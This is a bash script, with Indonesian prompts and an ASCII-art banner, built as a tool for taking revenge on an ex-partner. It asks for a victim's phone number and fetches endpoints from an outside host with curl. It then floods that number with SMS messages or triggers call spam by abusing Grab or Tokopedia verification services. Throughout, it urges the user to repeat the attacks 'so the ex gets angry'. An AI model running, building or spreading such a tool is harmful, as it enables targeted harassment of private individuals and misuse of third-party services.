#!/bin/bash
dendam(){
    clear
    sleep 0.03
    echo "         _ "
    sleep 0.03
    echo "        /_)  _.-===-._ "
    sleep 0.03
    echo "       /  .; '_-.'- .'.     _ "
    sleep 0.03
    echo "  __ _/  /.'\ ._  '. , \   (_\ "
    sleep 0.03
    echo " /\_( \  |.'.-._'- .  '|     \ "
    sleep 0.03
    echo " |_)  /  |/'    ''--''\|     _\__ "
    sleep 0.03
    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
    sleep 0.03
    echo " )/  (  \_      _      _/   \' (_| "
    sleep 0.03
    echo " /   /    \           /     _) (_/ "
    sleep 0.03
    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
    sleep 0.03
    echo " \    /  \ \  '''''  / / /     /   \ "
    sleep 0.03
    echo "  \_.'    \ \       / /  |   .' "
    sleep 0.03
    echo "   '--.,   \ \     / /  _;-'' "
    sleep 0.03
    echo "       '|   \ \   / /   | "
    sleep 0.03
    echo "       .;----'''''''----;. "
    sleep 0.03
    echo "      /(                 )\ "
    sleep 0.03
    echo "      \_''-------------''_/ "
    sleep 0.03
    echo "      | '';-----;-----;'' | "
    sleep 0.03
    echo "      | / : \ / : \ / : \ | "
    sleep 0.03
    echo "      |V.','.V.','.V.','.V| "
    sleep 0.03
    echo "      \'./_\.;./_\.;./_\.'/ "
    sleep 0.03
    echo "       ';..___________..;' "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo "== AYO GANGGU HIDUP MANTAN =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "GANGGU mantan Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "AYO GANGGU HIDUP MANTAN MU YANG SUDAH BAHAGIA"
    fi
}
#spam
spam(){
    clear
    dendam
    echo
    echo "[1] Spam kata- kata busuk "
    echo "[2] Spam panggilan busuk"
    echo "[3] Close dendam mantan"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "dendam Spam kata- kata busuk"
            #function spam
            echo
            echo "Silahkan masukan nomor MANTAN"
            echo contoh 0812345678
            read target # masukin no MANTAN
            echo
            echo "Berapa kata- kata busuk yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan kata- kata busuk dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam kata- kata busuk ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan dengan berkala agar mantan emosi "
                    echo
                    echo " MANTAN ADALAH OBJEK DENDAM "
                    echo " -MR.HC- "
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "dendam Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                   echo " Gunakan dengan berkala agar mantan emosi "
                  echo
                    echo " MANTAN ADALAH OBJEK DENDAM "
                    echo " -MR.HC- "
                  echo "========================================"
            else
                  echo Gunakan dengan berkala agar mantan emosi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Gunakan dengan berkala agar mantan emosi"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
dendam
echo Selamat datang kak, nama kk siapa? #tulisan keluar
read nick #membaca yang ditulis
clear
dendam
echo Selamat datang $nick ":)"
echo
echo "Mulai dendam mantan?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi